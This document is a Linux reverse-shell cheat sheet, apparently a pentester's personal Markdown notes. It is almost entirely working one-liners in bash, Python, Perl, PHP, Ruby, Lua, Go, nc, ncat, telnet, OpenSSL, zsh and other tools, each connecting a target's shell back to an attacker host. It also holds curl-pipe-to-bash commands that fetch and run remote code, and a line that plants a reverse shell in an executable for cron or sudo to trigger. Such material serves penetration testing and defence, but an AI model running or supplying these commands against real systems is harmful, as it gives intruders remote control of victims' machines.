---
id: Linux
aliases: []
tags:
  - Pentest/Shells/Reverse-Shell/Linux
---

# Linux

**Linux Reverse Shells**

<!-- Info {{{-->
> [!info]- Resources
>
> - [HackTricks](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/linux.html)
> - [Revshells](https://www.revshells.com/)
> - [GTFOBins](https://gtfobins.org/)
>
<!-- }}} -->

___

<!-- Awk {{{-->
## Awk

```sh
awk 'BEGIN {s = "/inet/tcp/0/<attacker_ip>/<port>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

___
<!-- }}} -->

<!-- Bash {{{-->
## Bash

curl https://reverse-shell.sh/1.1.1.1:3000 | bash
bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1
bash -i >& /dev/udp/127.0.0.1/4242 0>&1 #UDP
0<&196;exec 196<>/dev/tcp/<ATTACKER-IP>/<PORT>; sh <&196 >&196 2>&196
exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; done

#Short and bypass (credits to Dikline)
(sh)0>/dev/tcp/10.10.10.10/9091
#after getting the previous shell to get the output to execute
exec >&0

___
<!-- }}} -->

<!-- Finger {{{-->
## Finger

[finger](https://en.wikipedia.org/wiki/Finger_(protocol))

**Attacker**

```sh
while true; do nc -l 79; done
```

1. Type a command

2. Press `Enter`

3. Press `CTRL + D` to stop STDIN

**Target**

```sh
export X=Connected; \
while true; \
do X=`eval $(finger "$X"@<IP> 2> /dev/null')`; \
    sleep 1; \
done
```

```sh
export X=Connected; \
while true; \
do X=`eval $(finger "$X"@<IP> 2> /dev/null | grep '!'|sed 's/^!//')`; \
    sleep 1; \
done
```

___
<!-- }}} -->

<!-- Go {{{-->
## Go

```sh
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```

___
<!-- }}} -->

<!-- Gsocket {{{-->
## Gsocket

[Global Socket](https://www.gsocket.io/deploy/)
Deploy a reverse login shell with a single command
(*fully automated*) - and access the shell remotely

Install

[[cURL]]

```sh
bash -c "$(curl -fsSL gsocket.io/x)"
```

[[wget]]

```sh
bash -c "$(wget --no-verbose -O- https://gsocket.io/y)"
```

Uninstall

[[cURL]]

```sh
GS_UNDO=1 bash -c "$(curl -fsSL https://gsocket.io/y)"
```

[[wget]]

```sh
GS_UNDO=1 bash -c "$(wget --no-verbose -O- https://gsocket.io/y)"
```

Access

[[cURL]]

```sh
S="ExampleSecretChangeMe" bash -c "$(curl -fsSL https://gsocket.io/y)"
```

[[wget]]

```sh
S="ExampleSecretChangeMe" bash -c "$(wget --no-verbose -O- https://gsocket.io/y)"
```

___
<!-- }}} -->

<!-- Java {{{-->
## Java

```sh
r = Runtime.getRuntime()
```
```sh
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
```
```sh
p.waitFor()
```

___
<!-- }}} -->

<!-- Lua {{{-->
## Lua

```sh
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```

Linux & Windows

```sh
lua5.1 -e 'local host, port = "<attacker_ip>", <port> local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
___
<!-- }}} -->

<!-- Nc {{{-->
## Nc

[[Nc]]

```sh
nc -e /bin/sh <attacker_ip> <port>
```
```sh
nc <attacker_ip> <port> | /bin/sh
```
```sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker_ip> <port> >/tmp/f
```
```sh
nc <attacker_ip> <port1>| /bin/bash | nc <attacker_ip> <port2>
```
```sh
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <attacker_ip> <port> 1>/tmp/bkpipe
```

___
<!-- }}} -->

<!-- Netcat {{{-->
## Netcat

[[Netcat]] — Establish a reverse shell session to the target

```sh
ncat <attacker_ip> <port> -e /bin/bash
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> ncat 10.21.196.86 1234 -e /bin/bash
> ```
<!-- }}} -->

[[Netcat]] — Establish a reverse shell session to the target
             (*SSL Encryption over port `443`*)

```sh
ncat <attacker_ip> <port> --ssl -c "bash -i 2>&1"
```

<!-- Example {{{-->
> [!example]-
>
> **Attacker**
>
> ```sh
> ncat -l 443 --ssl
> ```
>
> **Target**
>
> ```sh
> ncat 10.10.11.52 443 --ssl  -c  "bash -i 2>&1"
> ```
>
<!-- }}} -->

[[#Bash]] — Append a shell to an executable file and execute it
            (*e.g., via Cron Job, SUID, sudo or user execution*)
            to spawn a reverse shell to the attacker

```sh
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker_ip> <port> >/tmp/f' | tee -a <file.sh>
```

___
<!-- }}} -->

<!-- OpenSSL {{{-->
## OpenSSL

**Attacker**

1. Generate certificate

```sh
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
```

2. Introduce the commands

```sh
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port>
```

3. Get the response

```sh
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2>
```

**Target**

```sh
openssl s_client -quiet -connect <attacker_ip>:<port1>| \
/bin/bash| \
openssl s_client -quiet -connect <attacker_ip>:<port2>
```

___
<!-- }}} -->

<!-- Perl {{{-->
## Perl

```sh
perl -e 'use Socket;$i="<attacker_ip>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

```sh
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

___
<!-- }}} -->

<!-- PHP {{{-->
## PHP

[exec](https://www.php.net/manual/en/function.exec.php)
is the most common method, but assumes that the file descriptor will be 3

```sh
php -r '$sock=fsockopen("<attacker_ip",<port>);exec("/bin/sh -i <&3 >&3 2>&3");'
```

```php
<?php exec("/bin/bash -c 'bash -i >/dev/tcp/<attacker_ip>/<port> 0>&1'"); ?>
```

[proc_open](https://www.php.net/manual/en/function.proc-open.php)
makes no assumptions about what the file descriptor will be

```php
<?php $sock=fsockopen("<attacker_ip>",<port>);$proc=proc_open("/bin/sh -i",array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>
```

[[#Bash]] & [[#Nc]]

```php
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker_ip> <port> >/tmp/f"); ?>
```
```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1'"); ?>
```
___
<!-- }}}-->

<!-- Python {{{-->
## Python

Linux

```sh
export RHOST="127.0.0.1"; \
export RPORT=12345; \
python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

```sh
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

IPv6

```sh
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
```

[PentestMonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) -
Simple reverse shell

<!-- Example {{{-->
> [!example]-
>
> ```sh
> python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker_ip>",<attacker_port>))
> ```
>
> ```sh
> import socket,subprocess,os
> s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
> s.connect(("<attacker_ip>",<attacker_port>))
> os.dup2(s.fileno(),0)
> os.dup2(s.fileno(),1)
> os.dup2(s.fileno(),2)
> p=subprocess.call(["/bin/sh","-i"])
> ```
<!-- }}} -->

___
<!-- }}} -->

<!-- Ruby {{{-->
## Ruby

```sh
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```
```sh
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

___
<!-- }}} -->

<!-- Rustcat {{{-->
## Rustcat

[Rustcat](https://github.com/robiot/rustcat) —
The modern Port listener and Reverse shell

**Attacker** – Interactive TLS listener with history & tab-completion

```sh
rcat listen -ib 55600
```

**Victim** – download static binary and connect back with /bin/bash

```sh
curl -L https://github.com/robiot/rustcat/releases/latest/download/rustcat-x86_64 -o /tmp/rcat \
  && chmod +x /tmp/rcat \
  && /tmp/rcat connect -s /bin/bash <ATTACKER-IP> 55600
```

Features:
- `--ssl` flag for encrypted transport (TLS 1.3) (*Optional*)
- `-s`: to spawn any binary (e.g. /bin/sh, python3) on the victim
- `--up`: to automatically upgrade to a fully interactive PTY
___

<!-- }}} -->

<!-- Telnet {{{-->
## Telnet

```sh
telnet <attacker_ip> <port> | /bin/sh #Blind
```

```sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <attacker_ip> <port> >/tmp/f
```

```sh
telnet <attacker_ip> <port> | /bin/bash | telnet <ATTACKER-IP> <PORT>
```

```sh
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <attacker_ip> <port> 1>/tmp/bkpipe
```

___
<!-- }}} -->

<!-- Xterm {{{-->
## Xterm

1. **Attacker**: Authorize host

```sh
xhost +targetip
```

2. **Attacker**: Listen on port `6001`

```sh
Xnest :1
```

3. **Target**: Connect to the system at port `6001`

```sh
xterm -display <attacker_ip>:1
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> xterm -display 10.0.0.1:1
> ```
>
<!-- }}} -->

<!-- }}} -->

<!-- Zsh {{{-->
## Zsh

**Zsh bulit-in TCP**

Requires no external binaries; leverages zsh/net/tcp module

```sh
zsh -c 'zmodload zsh/net/tcp; ztcp <ATTACKER-IP> <PORT>; zsh -i <&$REPLY >&$REPLY 2>&$REPLY'
```

___
<!-- }}} -->
